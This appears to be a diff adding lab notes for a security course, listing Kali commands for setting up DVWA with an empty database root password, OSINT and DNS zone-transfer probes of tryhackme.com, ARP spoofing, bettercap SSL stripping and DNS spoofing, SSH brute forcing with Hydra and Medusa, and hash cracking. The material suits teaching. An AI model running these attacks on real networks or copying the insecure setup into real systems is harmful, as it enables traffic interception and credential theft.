@@ -1,0 +1,143 @@
+Lab 1: DVWA on Kali
+bash
+sudo apt update
+sudo apt install -y apache2 mariadb-server php php-mysqli php-gd php-curl git
+sudo systemctl enable --now apache2 mariadb
+cd /var/www/html
+sudo rm -rf dvwa
+sudo git clone https://github.com/digininja/DVWA.git dvwa
+cd /var/www/html/dvwa/config
+sudo cp config.inc.php.dist config.inc.php
+sudo nano config.inc.php
+In config.inc.php, set the database values to:
+
+php
+$_DVWA['db_user'] = 'root';
+$_DVWA['db_password'] = '';
+
+Then run:
+sudo chown -R www-data:www-data /var/www/html/dvwa
+sudo chmod -R 755 /var/www/html/dvwa
+sudo systemctl restart apache2 mariadb
+
+Open in browser:
+http://localhost/dvwa/setup.php
+
+Then in the DVWA page, click:
+Create / Reset Database
+
+Login:
+admin
+password
+
+
+
+LAB 2
+whois tryhackme.com
+theHarvester -d tryhackme.com -b all
+nslookup tryhackme.com
+dig tryhackme.com
+dig any tryhackme.com
+shodan domain tryhackme.com
+
+If theHarvester is not installed:
+sudo apt update
+sudo apt install -y theharvester
+
+A more complete OSINT sequence:
+theHarvester -d tryhackme.com -b bing
+theHarvester -d tryhackme.com -b google
+theHarvester -d tryhackme.com -b duckduckgo
+
+
+
+LAB 3
+nslookup tryhackme.com
+nslookup -type=mx tryhackme.com
+nslookup -type=ns tryhackme.com
+nslookup -type=txt tryhackme.com
+dig tryhackme.com
+dig mx tryhackme.com
+dig ns tryhackme.com
+dig txt tryhackme.com
+host tryhackme.com
+host -t mx tryhackme.com
+host -t ns tryhackme.com
+dig @ns1.tryhackme.com tryhackme.com AXFR
+
+
+
+LAB 4
+sudo apt update
+sudo apt install -y ettercap-graphical wireshark docker.io
+sudo sysctl -w net.ipv4.ip_forward=1
+ip a
+ip route
+sudo docker run --name dvwa -p 80:80 vulnerables/web-dvwa
+sudo ettercap -G
+
+
+
+LAB 5
+sudo apt update
+sudo apt install -y dsniff ettercap-graphical tcpdump
+sudo sysctl -w net.ipv4.ip_forward=1
+ip a
+ip route
+sudo arpspoof -i eth0 -t 192.168.234.130 192.168.234.2
+# Terminal 2:
+sudo arpspoof -i eth0 -t 192.168.234.2 192.168.234.130
+# Terminal 3:
+sudo tcpdump -i eth0 -n -v
+sudo ettercap -T -M arp:remote /192.168.234.130// /192.168.234.2//
+
+
+
+LAB 6
+sudo apt update
+sudo apt install -y bettercap apache2 wireshark
+sudo service apache2 start
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo bettercap -iface eth0
+
+Inside Bettercap shell:
+net.probe on
+net.show
+set arp.spoof.targets 192.168.234.130
+set arp.spoof.fullduplex true
+arp.spoof on
+set http.proxy.sslstrip true
+http.proxy on
+set dns.spoof.domains tryhackme.com
+set dns.spoof.address 192.168.234.130
+dns.spoof on
+net.sniff on
+
+
+
+LAB 7
+sudo apt update
+sudo apt install -y hydra hashcat john medusa wordlists
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+sudo service ssh start
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -V 127.0.0.1 ssh
+echo -n "password123" | md5sum | awk '{print $1}' > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+hashcat -m 0 -a 0 --force hash.txt /usr/share/wordlists/rockyou.txt
+medusa -h 127.0.0.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
+
+
+
+LAB 8
+sudo apt update
+sudo apt install -y hashid rainbowcrack argon2 python3-bcrypt
+echo -n "abc123" | md5sum
+echo -n "abc123" | sha1sum
+hashid e99a18c428cb38d5f260853678922e03
+cd /usr/share/rainbowcrack/
+sudo rtgen md5 loweralpha-numeric 1 6 0 1000 1000 0
+sudo rtsort .
+rcrack . -h e99a18c428cb38d5f260853678922e03
+python3 -c "import bcrypt; h=bcrypt.hashpw(b'password123', bcrypt.gensalt(rounds=12)); print(h)"
+echo -n "password123" | argon2 randomsalt -id -t 3 -m 16 -p 4
